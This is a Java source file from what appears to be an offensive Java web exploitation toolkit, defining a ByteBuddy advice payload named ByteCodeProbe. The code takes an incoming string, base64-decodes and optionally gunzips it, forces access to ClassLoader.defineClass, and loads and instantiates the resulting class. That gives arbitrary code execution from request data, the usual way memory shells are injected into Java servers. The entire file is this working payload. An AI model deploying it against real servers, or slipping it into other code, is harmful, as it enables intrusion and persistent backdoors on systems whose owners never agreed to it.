package com.reajason.javaweb.probe.payload;

import lombok.SneakyThrows;
import net.bytebuddy.asm.Advice;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Method;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 * @since 2025/8/5
 */
public class ByteCodeProbe {

    private final String base64Str;

    public ByteCodeProbe(String base64Str) {
        this.base64Str = base64Str;
    }

    @Advice.OnMethodExit
    public static String exit(@Advice.Argument(0) String data, @Advice.Return(readOnly = false) String ret) throws Throwable {
        Class<?> decoderClass;
        byte[] classBytes;
        String base64 = data;
        boolean gzip = data.startsWith("H4s");
        if (!gzip && !data.startsWith("yv66vgAAAD")) {
            base64 = "yv66vgAAAD" + data;
        }
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            classBytes = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            classBytes = (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64);
        }
        if (gzip) {
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            GZIPInputStream gzipInputStream = null;
            try {
                gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(classBytes));
                byte[] buffer = new byte[4096];
                int n;
                while ((n = gzipInputStream.read(buffer)) > 0) {
                    out.write(buffer, 0, n);
                }
                classBytes = out.toByteArray();
            } finally {
                if (gzipInputStream != null) {
                    gzipInputStream.close();
                }
                out.close();
            }
        }
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        defineClass.setAccessible(true);
        Class<?> clazz = (Class<?>) defineClass.invoke(new java.net.URLClassLoader(new java.net.URL[]{}, Thread.currentThread().getContextClassLoader()), classBytes, 0, classBytes.length);
        return ret = clazz.newInstance().toString();
    }

    @Override
    @SneakyThrows
    public String toString() {
        return ByteCodeProbe.exit(base64Str, super.toString());
    }
}
